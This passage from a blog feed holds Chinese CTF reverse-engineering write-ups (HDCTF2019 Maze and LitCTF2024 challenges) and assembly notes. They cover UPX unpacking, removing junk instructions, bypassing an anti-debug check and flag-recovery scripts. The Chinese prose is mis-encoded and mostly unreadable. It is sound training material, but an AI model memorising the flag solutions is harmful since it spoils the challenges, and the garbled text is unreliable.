class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><span class="comment">#åŸæ¥çš„base64è¡¨</span></span><br><span class="line">newtable=<span class="string">&#x27;ABCDEFQRSTUVWXYPGHIJKLMNOZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><span class="comment">#ç°åœ¨è¡¨</span></span><br><span class="line">maketrans=<span class="built_in">str</span>.maketrans(newtable,tables64)<span class="comment">#ä¸ä¼šï¼Œè®°ä½å§ï¼Œé“å­ä»¬</span></span><br><span class="line">translate=string.translate(maketrans)</span><br><span class="line">flag=base64.b64decode(string.translate(<span class="built_in">str</span>.maketrans(newtable,tables64)))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buu[HDCTF]MAZE</title>
      <link href="/2024/06/04/%5BHDCTF2019%5DMaze/"/>
      <url>/2024/06/04/%5BHDCTF2019%5DMaze/</url>
      
        <content type="html"><![CDATA[<h2 id="HDCTF2019-Maze4"><a href="#HDCTF2019-Maze4" class="headerlink" title="[HDCTF2019]Maze4"></a>[HDCTF2019]Maze4</h2><p>è¿™ä¸ªé¢˜ä¸»è¦æ˜¯å­¦ä¹ èŠ±æŒ‡ä»¤çš„å»é™¤ï¼Œè¿·å®«å¹¶ä¸éš¾</p><p>ä¸è¿‡åœ¨ä½¿ç”¨upxå»å£³å‰éœ€è¦æŠŠæ–‡ä»¶åä¸­çš„ç©ºæ ¼å»é™¤ï¼Œå¦åˆ™ä¼šè„±å£³å¤±è´¥</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/hdctfmaze/hdmaze01.png" alt="hdmaze01"></p><p>ï¼ˆèŠ±æŒ‡ä»¤çš„æœ‰å…³å†…å®¹ç›¸å…³è¯·çœ‹ä»¥ä¸‹æ–‡ç« ï¼‰</p><p><a href="https://bbs.kanxue.com/thread-279604.htm">https://bbs.kanxue.com/thread-279604.htm</a></p><p><a href="https://blog.csdn.net/abel_big_xu/article/details/117927674">https://blog.csdn.net/abel_big_xu/article/details/117927674</a></p><p><a href="https://blog.csdn.net/m0_46296905/article/details/117336574">https://blog.csdn.net/m0_46296905/article/details/117336574</a></p><p>ç„¶åæ‹–å…¥idaä¸­å‘ç°æœ‰èŠ±æŒ‡ä»¤</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/hdctfmaze/hdmaze02.png" alt="hdmaze02"></p><p>æ‘uè½¬æ¢æˆäºŒè¿›åˆ¶</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/hdctfmaze/hdmaze03.png" alt="hdmaze03"></p><p>æ‘cé‡æ–°åˆ†æä¸ºä»£ç </p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/hdctfmaze/hdmaze04.png" alt="hdmaze04"></p><p>é€‰å®šå…¨éƒ¨çš„çº¢è‰²åœ°å€æ‘pè¿›è¡Œç”Ÿæˆå‡½æ•°</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/hdctfmaze/hdmaze05.png" alt="hdmaze05"></p><p>è¿™æ—¶mainå‡½æ•°å°±è¢«è§£å‡ºæ¥äº†ç„¶åè¿›å…¥ç‚¹å‡»f5</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/hdctfmaze/hdmaze06.png" alt="hdmaze06"></p><p>asc_408078å’Œdword_40807cåªè¦æ”¾åœ¨å“ªå°±è¡Œ,</p><p>ä½†æ˜¯wï¼ˆä¸Šï¼‰sï¼ˆä¸‹ï¼‰aï¼ˆå·¦ï¼‰dï¼ˆå³ï¼‰è€ƒè™‘çš„å°±æ¯”è¾ƒå¤šäº†</p><p>shift+f12æŸ¥çœ‹å­—ç¬¦ä¸²è¡¨æ‰¾åˆ°è¿·å®«åœ°å›¾</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/hdctfmaze/hdmaze07.png" alt="hdmaze07"></p><p>é•¿åº¦æ˜¯70ä¸ªå­—ç¬¦ï¼Œå¯èƒ½æ˜¯7*10æˆ–è€…10*7ï¼ˆå»ºè®®å»ä¸€äº›ç¼–ç¨‹ç¯å¢ƒå†…è¿›è¡Œæ’åˆ—ï¼Œæœ‰å­—ç¬¦è‡ªåŠ¨å¯¹é½ï¼‰</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/hdctfmaze/hdmaze08.png" alt="hdmaze08"></p><p>flagå°±æ˜¯é€šå…³è¿·å®«æ—¶é”®ç›˜çš„è¾“å…¥</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>LitCTF2024é€†å‘wp</title>
      <link href="/2024/06/03/litctf24%EF%BC%88%E9%83%BD%E6%98%AF%E8%80%BB%E8%BE%B1%EF%BC%89/"/>
      <url>/2024/06/03/litctf24%EF%BC%88%E9%83%BD%E6%98%AF%E8%80%BB%E8%BE%B1%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="litctf24ï¼ˆéƒ½æ˜¯è€»è¾±ï¼‰"><a href="#litctf24ï¼ˆéƒ½æ˜¯è€»è¾±ï¼‰" class="headerlink" title="litctf24ï¼ˆéƒ½æ˜¯è€»è¾±ï¼‰"></a>litctf24ï¼ˆéƒ½æ˜¯è€»è¾±ï¼‰</h1><h2 id="RUNMRE"><a href="#RUNMRE" class="headerlink" title="RUNMRE"></a>RUNMRE</h2><p>æ— å£³ï¼Œæ‹¿æŸ¥çœ‹shift+F12</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/runme01.png" alt="runme01"></p><p>ç¬¬ä¸€è¡Œæ˜¯base64åŠ å¯†åçš„å­—ç¬¦ä¸²</p><p>ç¬¬äºŒè¡Œæ˜¯é­”æ”¹åçš„baseè¡¨</p><p>&#x3D;&#x3D;è¿™æ˜¯åŸè¡¨ï¼šABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;&#x3D;&#x3D;</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/runme02.png" alt="runme02"></p><h2 id="ezpythonï¼ˆä¸ä¸‰ä¸ªpythonçš„ç¯å¢ƒé»˜è®¤ç¼ æ–—ä¸€ä¸Šåˆï¼‰"><a href="#ezpythonï¼ˆä¸ä¸‰ä¸ªpythonçš„ç¯å¢ƒé»˜è®¤ç¼ æ–—ä¸€ä¸Šåˆï¼‰" class="headerlink" title="ezpythonï¼ˆä¸ä¸‰ä¸ªpythonçš„ç¯å¢ƒé»˜è®¤ç¼ æ–—ä¸€ä¸Šåˆï¼‰"></a>ezpythonï¼ˆä¸ä¸‰ä¸ªpythonçš„ç¯å¢ƒé»˜è®¤ç¼ æ–—ä¸€ä¸Šåˆï¼‰</h2><p>pythonæ‰“åŒ…æˆçš„exeæˆ‘ä»¬è¦ç”¨pyinstxtractor.pyæ¥è¿›è¡Œè§£åŒ…</p><p>è§£å®ŒåŒ…æˆ‘ä»¬å°†ezpy.pycæ‰”è¿›åœ¨çº¿ç½‘ç«™ä¸­åç¼–è¯‘æˆ.py</p><p>ï¼ˆåç¼–è¯‘ç½‘ç«™<a href="https://www.lddgo.net/string/pyc-compile-decompile%EF%BC%89">https://www.lddgo.net/string/pyc-compile-decompileï¼‰</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 3.11</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Litctfbase64</span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">&#x27;flag:&#x27;</span>)</span><br><span class="line">flag = Litctfbase64.b64decode(flag)</span><br><span class="line"><span class="keyword">if</span> flag == <span class="string">&#x27;X=3o4hx=0EZwf=mMv13gX=3o4hx=qje2ZjtgZQmEKXZog4==&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;win&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;no&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬å»è§£åŒ…åäº§ç”Ÿçš„æ–‡ä»¶å¤¹çš„PYZ-00.pyz_extractedæ–‡ä»¶å¤¹æ‰¾åˆ°Litctfbase64.pyc</p><p>åŒä¸Šè¯‰æ­¥éª¤è¿›è¡Œåç¼–è¯‘æˆ.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Visit https://www.lddgo.net/string/pyc-compile-decompile for more information</span></span><br><span class="line"><span class="comment"># Version : Python 3.11</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">BASE64_ALPHABET = <span class="string">&#x27;8kuWYm=1JiUPs7DT4x+X5tcqZKfGvA0gFLB6y3QbV2rNOlRdMwnEohjzSe9/HIa-&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64decode</span>(<span class="params">input_string</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># WARNING: Decompyle incomplete</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">from_base64</span>(<span class="params">base64_string</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># WARNING: Decompyle incomplete</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è·å¾—äº†base64çš„é­”æ”¹è¡¨</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/ezpy01.png" alt="ezpy01"></p><h2 id="hello-upx-ä½ æ˜¯çœŸçš„é€†å¤©"><a href="#hello-upx-ä½ æ˜¯çœŸçš„é€†å¤©" class="headerlink" title="hello_upx(ä½ æ˜¯çœŸçš„é€†å¤©)"></a>hello_upx(ä½ æ˜¯çœŸçš„é€†å¤©)</h2><p>æ—¢ç„¶æ˜¯upxå°±è¿›è¡Œè„±å£³,ä½†æ˜¯ä¼šæœ‰æŠ¥é”™æç¤ºè¢«hacked</p><p>ç”¨010æ‰“å¼€ä¹çœ‹æ²¡æœ‰é—®é¢˜,å®é™…ä¸Šå‡ºé¢˜äººå§**&#x3D;&#x3D;UPX&#x3D;&#x3D;<strong>æ›¿æ¢æˆäº†å°å†™çš„</strong>upx**</p><p>äºæ˜¯æˆ‘ä»¬å°†upxæ”¹æ­£ä¸ºUPXç„¶åå†è„±å£³æ‹–å…¥idaä¸­æŸ¥çœ‹mainå‡½æ•°</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/hello_upx02.png" alt="hello_upx02"></p><p>v4å’Œv5å…±åŒç»„æˆä¸€ä¸ªå°ç«¯åº</p><p>å½“v4[i]&#x3D;v6[i]-iæ—¶è¾“å‡ºgood</p><p>æ‰€ä»¥è„šæœ¬ä¸º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> =[<span class="number">0x4C</span>,<span class="number">0x68</span>,<span class="number">0x72</span>,<span class="number">0x40</span>,<span class="number">0x50</span>,<span class="number">0x41</span>,<span class="number">0x75</span>,<span class="number">0x70</span>,<span class="number">0x2B</span>,<span class="number">0x63</span>,<span class="number">0x59</span>,<span class="number">0x25</span>,<span class="number">0x61</span>,<span class="number">0x58</span>,<span class="number">0x51</span>,<span class="number">0x65</span>,<span class="number">0x20</span>,<span class="number">0x4E</span>,<span class="number">0x5A</span>,<span class="number">0x1E</span>,<span class="number">0x60</span>,<span class="number">0x4E</span>,<span class="number">0x5E</span>,<span class="number">0x4F</span>,<span class="number">0x65</span>]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">flag += <span class="built_in">chr</span>(<span class="built_in">str</span>[i] + i)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="ezRC4"><a href="#ezRC4" class="headerlink" title="ezRC4"></a>ezRC4</h2><p>ç›´æ¥åŠ¨è°ƒä¼šé—ªé€€ï¼Œmain0æœ‰ä¸ªåè°ƒè¯•ç¨‹åºæˆ‘ä»¬éœ€è¦åœ¨è¿™é‡Œæ‰“ä¸ªæ–­ç‚¹</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/ezrc405.png" alt="ezrc405"></p><p>ç„¶ååœ¨ä¸Šé¢è°ƒæˆè¿™æ ·è¿›è¡Œå•æ­¥è°ƒè¯•ï¼ˆf7ï¼‰</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/ezrc401.jpg" alt="ezrc401"></p><p>è¿›å…¥è°ƒè¯•ååœ¨è¿›åˆ°è¿™ä¸€æ­¥æ—¶æˆ‘ä»¬éœ€è¦å°†ZFçš„å€¼æ”¹æˆ1ç„¶åè¿›å…¥åˆ°<strong>çœŸ</strong>æ¨¡å—å¦åˆ™å°±ä¼šè‡ªåŠ¨é€€å‡º</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/ezrc401.png" alt="ezrc401"></p><p>f7å•æ­¥è¿›å…¥</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/ezrc404.png" alt="ezrc404"></p><p>åˆ°è¿™é‡Œæ—¶å‘ç°æˆ‘ä»¬ä¹‹å‰åœ¨é™æ€å‡½æ•°é‡Œå‘ç°çš„key</p><p>ç¬¬äºŒä¸ªå—æ˜¯å¯¹keyè¿›è¡Œè§£å¯†</p><p>è§£å¯†åçš„keyä¸º</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/ezrc403.png" alt="ezrc403"></p><p>ç„¶åæ ¹æ®å‰é¢é™æ€çš„mainå‡½æ•°ä¸­çš„buf1</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/ezrc402.png" alt="ezrc402"></p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/rc406.png" alt="rc406"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æ±‡ç¼–è¯­è¨€</title>
      <link href="/2024/05/21/%E6%B1%87%E7%BC%96/"/>
      <url>/2024/05/21/%E6%B1%87%E7%BC%96/</url>
      
        <content type="html"><![CDATA[<h1 id="æ±‡ç¼–è¯­è¨€"><a href="#æ±‡ç¼–è¯­è¨€" class="headerlink" title="æ±‡ç¼–è¯­è¨€"></a>æ±‡ç¼–è¯­è¨€</h1><h2 id="ç¬¬ä¸€ç« åŸºç¡€çŸ¥è¯†"><a href="#ç¬¬ä¸€ç« åŸºç¡€çŸ¥è¯†" class="headerlink" title="ç¬¬ä¸€ç« åŸºç¡€çŸ¥è¯†"></a>ç¬¬ä¸€ç« åŸºç¡€çŸ¥è¯†</h2><h4 id="æ±‡ç¼–è¯­è¨€çš„ç»„æˆï¼š"><a href="#æ±‡ç¼–è¯­è¨€çš„ç»„æˆï¼š" class="headerlink" title="æ±‡ç¼–è¯­è¨€çš„ç»„æˆï¼š"></a>æ±‡ç¼–è¯­è¨€çš„ç»„æˆï¼š</h4><p>&#x3D;&#x3D;1.æ±‡ç¼–æŒ‡ä»¤ï¼ˆæ ¸å¿ƒï¼‰&#x3D;&#x3D;ï¼šæœºå™¨ç çš„åŠ©è®°ç¬¦ï¼Œæœ‰å¯¹åº”çš„æœºå™¨ç ã€‚</p><p>2.ä¼ªæŒ‡ä»¤ï¼šæ²¡æœ‰å¯¹åº”çš„æœºå™¨ç ï¼Œç”±ç¼–è¯‘å™¨<em><strong>æ‰§è¡Œ</strong></em>ï¼Œè®¡ç®—æœºå¹¶ä¸æ‰§è¡Œã€‚</p><p>3.å…¶ä»–ç¬¦å·ï¼šå¦‚+ã€-ã€*ã€&#x2F;ç­‰ï¼Œç”±ç¼–è¯‘å™¨ <em><strong>è¯†åˆ«</strong></em>ï¼Œæ²¡æœ‰å¯¹åº”çš„æœºå™¨ç ã€‚ã€‚</p><h4 id="å‚¨å­˜å•å…ƒï¼š"><a href="#å‚¨å­˜å•å…ƒï¼š" class="headerlink" title="å‚¨å­˜å•å…ƒï¼š"></a>å‚¨å­˜å•å…ƒï¼š</h4><p>&#x3D;&#x3D;nä½çš„cpuï¼Œ<strong>ä¸€ä¸ªå­—</strong>å°±æœ‰<strong>ï¼ˆn&#x2F;8ï¼‰ä¸ªå­—èŠ‚</strong>&#x3D;&#x3D;ï¼ˆè¿™åº”è¯¥æ˜¯ç¬¬äºŒç« çš„å†…å®¹ï¼Œä½†æ˜¯æˆ‘è§‰å¾—é¦–å…ˆè¦æŠŠå•ä½åˆ†æ¸…æ¥šå°±æ”¾åœ¨è¿™é‡Œäº†ï¼‰</p><p>&#x3D;&#x3D;<strong>Byte</strong>ï¼ˆå‚¨å­˜å•å…ƒ&#x2F;å­—èŠ‚ï¼‰ç®€å†™ <strong>B</strong>&#x3D;&#x3D;</p><p><strong>1KB&#x3D;1024B1MB&#x3D;1024KB1GB&#x3D;1024MB1TB&#x3D;1024GB</strong></p><p><strong>1024 &#x3D; 10^10</strong></p><p>è®¡ç®—æœºæœ€å°å•ä½æ˜¯<strong>bitï¼ˆæ¯”ç‰¹ï¼‰</strong>å¦‚æœä¸€ä¸ªè®¡ç®—æœºæœ‰<strong>128</strong>ä¸ª<strong>å‚¨å­˜å•å…ƒ</strong>ï¼Œ<strong>ç¼–å·ä»0~127</strong></p><p><img src="/2024/05/21/%E6%B1%87%E7%BC%96/Users\admin\Desktop\å¾®ä¿¡å›¾ç‰‡_20231119201725.png" alt="å¾®ä¿¡å›¾ç‰‡_20231119201725"><br>&#96;11111</p><h4 id="cpuå¯¹å‚¨å­˜å™¨éƒ½è¯»å†™"><a href="#cpuå¯¹å‚¨å­˜å™¨éƒ½è¯»å†™" class="headerlink" title="cpuå¯¹å‚¨å­˜å™¨éƒ½è¯»å†™"></a>cpuå¯¹å‚¨å­˜å™¨éƒ½è¯»å†™</h4><p>CPU è¦æƒ³è¿›è¡Œæ•°æ®çš„è¯»å†™ï¼Œå¿…é¡»å’Œå¤–éƒ¨å™¨ä»¶(æ ‡å‡†çš„è¯´æ³•æ˜¯èŠ¯ç‰‡)è¿›è¡Œä¸‹é¢ 3ç±»ä¿¡æ¯çš„äº¤äº’ã€‚<br><strong>1.å­˜å‚¨å•å…ƒçš„åœ°å€(åœ°å€ä¿¡æ¯);</strong><br><strong>2.å™¨ä»¶çš„é€‰æ‹©ï¼Œè¯»æˆ–å†™çš„å‘½ä»¤(æ§åˆ¶ä¿¡æ¯);</strong><br><strong>3.è¯»æˆ–å†™çš„æ•°æ®(æ•°æ®ä¿¡æ¯)ã€‚</strong></p><p>CPU æ˜¯é€šè¿‡**&#x3D;&#x3D;æ€»çº¿&#x3D;&#x3D;**å°†åœ°å€ã€æ•°æ®å’Œæ§åˆ¶ä¿¡æ¯ä¼ åˆ°å­˜å‚¨å™¨èŠ¯ç‰‡ä¸­çš„</p><p>**&#x3D;&#x3D;æ€»çº¿&#x3D;&#x3D;<strong>æ˜¯è®¡ç®—æœºä¸­ä¸“é—¨è¿æ¥CPU å’Œå…¶ä»–èŠ¯ç‰‡çš„å¯¼çº¿ã€‚ä»ç‰©ç†ä¸Šæ¥è®²ï¼Œå°±æ˜¯ä¸€æ ¹æ ¹å¯¼çº¿çš„é›†åˆã€‚æ ¹æ®ä¼ é€ä¿¡æ¯çš„ä¸åŒï¼Œæ€»çº¿ä»é€»è¾‘ä¸Šåˆåˆ†ä¸º3 ç±»ï¼Œ</strong>&#x3D;&#x3D;åœ°å€æ€»çº¿&#x3D;&#x3D;<strong>ã€&#x3D;&#x3D;<strong>æ§åˆ¶æ€»çº¿</strong>&#x3D;&#x3D;å’Œ</strong>&#x3D;&#x3D;æ•°æ®æ€»çº¿&#x3D;&#x3D;**ã€‚</p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231120152544401.png" alt="image-20231120152544401"></p><p>(1)CPU é€šè¿‡åœ°å€çº¿å°†åœ°å€ä¿¡æ¯3 å‘å‡ºã€‚</p><p>(2)CPU é€šè¿‡æ§åˆ¶çº¿å‘å‡ºå†…å­˜è¯»å‘½ä»¤ï¼Œé€‰ä¸­å­˜å‚¨å™¨èŠ¯ç‰‡ï¼Œå¹¶é€šçŸ¥å®ƒï¼Œå°†è¦ä»ä¸­è¯»å–æ•°æ®ã€‚</p><p>(3)å­˜å‚¨å™¨å°†3å·å•å…ƒä¸­çš„æ•°æ®8é€šè¿‡æ•°æ®çº¿é€å…¥CPUã€‚</p><h4 id="åœ°å€æ€»çº¿"><a href="#åœ°å€æ€»çº¿" class="headerlink" title="åœ°å€æ€»çº¿"></a>åœ°å€æ€»çº¿</h4><p>ä¸€ä¸ªCPUæœ‰<strong>Næ ¹åœ°å€çº¿</strong>ï¼Œåˆ™å¯ä»¥è¯´è¿™ä¸ª CPU çš„<strong>åœ°å€æ€»çº¿çš„&#x3D;&#x3D;å®½åº¦&#x3D;&#x3D;ä¸º N</strong>ã€‚è¿™æ ·çš„ CPUæœ€å¤šå¯ä»¥å¯»æ‰¾<strong>2çš„N æ¬¡æ–¹</strong>ä¸ªå†…å­˜å•å…ƒã€‚<strong>æœ€å°æ•°æ˜¯0ï¼Œæœ€å¤§æ•°æ˜¯(2^n)-1</strong></p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231120153933375.png" alt="image-20231120153933375"></p><p>å›¾1.4å±•ç¤ºäº†ä¸€ä¸ªå…·æœ‰ 1æ ¹åœ°å€çº¿çš„CPUå‘å†…å­˜å‘å‡ºåœ°å€ä¿¡æ¯11æ—¶ 10æ ¹åœ°å€çº¿ä¸Šä¼ é€çš„äºŒè¿›åˆ¶ä¿¡æ¯ã€‚</p><h4 id="æ•°æ®æ€»çº¿"><a href="#æ•°æ®æ€»çº¿" class="headerlink" title="æ•°æ®æ€»çº¿"></a>æ•°æ®æ€»çº¿</h4><p>CPU ä¸å†…å­˜æˆ–å…¶ä»–å™¨ä»¶ä¹‹é—´çš„<strong>æ•°æ®ä¼ é€</strong>æ˜¯é€šè¿‡<strong>æ•°æ®æ€»çº¿</strong>æ¥è¿›è¡Œçš„ã€‚<em><em>æ•°æ®æ€»çº¿çš„&#x3D;&#x3D;å®½åº¦&#x3D;&#x3D;<strong>å†³å®šäº† <em><strong>CPU</strong></em> å’Œ</strong></em>å¤–ç•Œçš„æ•°æ®</em><strong><strong>&#x3D;&#x3D;ä¼ é€é€Ÿåº¦&#x3D;&#x3D;<strong>ã€‚</strong>8</strong> æ ¹æ•°æ®æ€»çº¿ä¸€æ¬¡å¯ä¼ é€<strong>ä¸€ä¸ª</strong> <em><strong>&#x3D;&#x3D;å­—èŠ‚&#x3D;&#x3D;</strong></em>(å­—èŠ‚æ˜¯8è¿›åˆ¶æ•°æ®)ã€‚**16</strong> æ ¹æ•°æ®æ€»çº¿ä¸€æ¬¡å¯ä¼ é€<strong>ä¸¤ä¸ªå­—èŠ‚</strong>ã€‚</p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231120154658074.png" alt="image-20231120154658074"></p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231120154746520.png" alt="image-20231120154746520"></p><h4 id="æ§åˆ¶æ€»çº¿"><a href="#æ§åˆ¶æ€»çº¿" class="headerlink" title="æ§åˆ¶æ€»çº¿"></a>æ§åˆ¶æ€»çº¿</h4><p>CPU å¯¹å¤–éƒ¨å™¨ä»¶çš„æ§åˆ¶æ˜¯é€šè¿‡<strong>æ§åˆ¶æ€»çº¿</strong>æ¥è¿›è¡Œçš„ã€‚åœ¨è¿™é‡Œæ§åˆ¶æ€»çº¿æ˜¯ä¸ªæ€»ç§°ï¼Œ<strong>æ§åˆ¶æ€»çº¿æ˜¯ä¸€äº›ä¸åŒæ§åˆ¶çº¿çš„é›†åˆ</strong>ã€‚æœ‰å¤šå°‘æ ¹æ§åˆ¶æ€»çº¿ï¼Œå°±æ„å‘³ç€ CPU æä¾›äº†å¯¹å¤–éƒ¨å™¨ä»¶çš„å¤šå°‘ç§æ§åˆ¶ã€‚æ‰€ä»¥ï¼Œ**&#x3D;&#x3D;æ§åˆ¶æ€»çº¿çš„å®½åº¦å†³å®šäº† CPU å¯¹å¤–éƒ¨å™¨ä»¶çš„æ§åˆ¶èƒ½åŠ›ã€‚&#x3D;&#x3D;**<br>å‰é¢æ‰€è®²çš„å†…å­˜<strong>è¯»æˆ–å†™</strong>å‘½ä»¤æ˜¯ç”±<strong>å‡ æ ¹æ§åˆ¶çº¿ç»¼åˆå‘å‡º</strong>çš„ï¼Œå…¶ä¸­æœ‰ä¸€æ ¹ç§°ä¸º<strong>â€œè¯»ä¿¡å·è¾“å‡ºâ€</strong>çš„<strong>æ§åˆ¶çº¿</strong>è´Ÿè´£<strong>ç”± CPU å‘å¤–ä¼ é€è¯»ä¿¡å·</strong>ï¼ŒCPU å‘è¯¥æ§åˆ¶çº¿ä¸Šè¾“å‡º<strong>ä½ç”µå¹³è¡¨ç¤ºå°†è¦è¯»å–æ•°æ®</strong>:æœ‰ä¸€æ ¹ç§°ä¸ºâ€œ<strong>å†™ä¿¡å·è¾“å‡ºâ€çš„æ§åˆ¶çº¿</strong>åˆ™è´Ÿè´£<strong>ä¼ é€å†™ä¿¡å·</strong>ã€‚</p><h4 id="å†…å­˜åœ°å€ç©ºé—´-æ¦‚è¿°"><a href="#å†…å­˜åœ°å€ç©ºé—´-æ¦‚è¿°" class="headerlink" title="å†…å­˜åœ°å€ç©ºé—´(æ¦‚è¿°)"></a>å†…å­˜åœ°å€ç©ºé—´(æ¦‚è¿°)</h4><p>ä»€ä¹ˆæ˜¯å†…å­˜åœ°å€ç©ºé—´å‘¢?ä¸¾ä¾‹æ¥è®²ï¼Œä¸€ä¸ª CPU çš„åœ°å€æ€»çº¿å®½åº¦ä¸º 10ï¼Œé‚£ä¹ˆå¯ä»¥å¯»å€1024 ä¸ªå†…å­˜å•å…ƒï¼Œ**&#x3D;&#x3D;è¿™ 1024 ä¸ªå¯å¯»åˆ°çš„å†…å­˜å•å…ƒå°±æ„æˆè¿™ä¸ªCPUçš„å†…å­˜åœ°å€ç©ºé—´&#x3D;&#x3D;**ã€‚</p><h4 id="ä¸»æ¿"><a href="#ä¸»æ¿" class="headerlink" title="ä¸»æ¿"></a>ä¸»æ¿</h4><p>åœ¨æ¯ä¸€å° PC æœºä¸­ï¼Œéƒ½æœ‰ä¸€ä¸ªä¸»æ¿ï¼Œ<strong>ä¸»æ¿ä¸Šæœ‰æ ¸å¿ƒå™¨ä»¶å’Œä¸€äº›ä¸»è¦å™¨ä»¶</strong>ï¼Œ<strong>è¿™äº›å™¨ä»¶é€šè¿‡æ€»çº¿(åœ°å€æ€»çº¿ã€æ•°æ®æ€»çº¿ã€æ§åˆ¶æ€»çº¿)ç›¸è¿</strong>ã€‚è¿™äº›å™¨ä»¶æœ‰ <strong>CPUã€å­˜å‚¨å™¨ã€å¤–å›´èŠ¯ç‰‡ç»„ã€æ‰©å±•æ’æ§½ç­‰</strong>ã€‚<strong>æ‰©å±•æ’æ§½ä¸Šä¸€èˆ¬æ’æœ‰ RAMå†…å­˜æ¡å’Œå„ç±»æ¥å£å¡</strong>ã€‚</p><h4 id="æ¥å£å¡"><a href="#æ¥å£å¡" class="headerlink" title="æ¥å£å¡"></a>æ¥å£å¡</h4><p>è®¡ç®—æœºç³»ç»Ÿä¸­ï¼Œæ‰€æœ‰å¯ç”¨ç¨‹åºæ§åˆ¶å…¶å·¥ä½œçš„è®¾å¤‡ï¼Œå¿…é¡»å—åˆ° CPU çš„æ§åˆ¶ã€‚CPU å¯¹å¤–éƒ¨è®¾å¤‡éƒ½ä¸èƒ½ç›´æ¥æ§åˆ¶ï¼Œå¦‚æ˜¾ç¤ºå™¨ã€éŸ³ç®±ã€æ‰“å°æœºç­‰ã€‚ç›´æ¥æ§åˆ¶è¿™äº›è®¾å¤‡è¿›è¡Œå·¥ä½œçš„æ˜¯æ’åœ¨æ‰©å±•æ’æ§½ä¸Šçš„æ¥å£å¡ã€‚<strong>æ‰©å±•æ’æ§½&#x3D;&#x3D;é€šè¿‡æ€»çº¿&#x3D;&#x3D;å’Œ &#x3D;&#x3D;CPU&#x3D;&#x3D; ç›¸è¿ï¼Œæ‰€ä»¥&#x3D;&#x3D;æ¥å¡ä¹Ÿé€šè¿‡æ€»çº¿åŒ CPU&#x3D;&#x3D;ç›¸è¿</strong>ã€‚CPU å¯ä»¥ç›´æ¥æ§åˆ¶è¿™äº›æ¥å£å¡ï¼Œä»è€Œå®ç° CPU 